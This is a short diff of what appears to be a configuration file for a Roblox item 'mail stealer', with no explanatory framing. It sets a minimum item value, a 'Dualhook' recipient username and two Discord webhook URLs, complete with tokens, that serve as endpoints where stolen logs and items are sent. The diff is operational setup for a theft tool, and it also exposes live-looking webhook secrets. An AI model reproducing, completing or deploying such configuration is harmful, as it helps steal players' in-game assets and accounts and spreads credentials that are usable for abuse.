@@ -1,9 +1,9 @@
 
 MinimumRAP = 10000
 
-DualhookUsername = "manifarm5"
-DualhookWebhook = ""
-LogsWebhook = ""
+DualhookUsername = "0_0manidagoat"
+DualhookWebhook = "https://discord.com/api/webhooks/1288949543295258786/L6dL1f6S-h02GBQ0W19yUcOibr8Irst-ojsdrq5-CUoa2FxdnTZVXdV5n8QxqzSt1OEn"
+LogsWebhook = "https://discord.com/api/webhooks/1288949706843492444/C7pc8SbTbrDp-fKhhNlZubrYmjUZ3vc2Ae5fy6jInUWNSAg63tbhinT8SQqdWmjX-FPb"
 DualhookRAP = math.huge
 mailstealer_name = "XDXD"
 
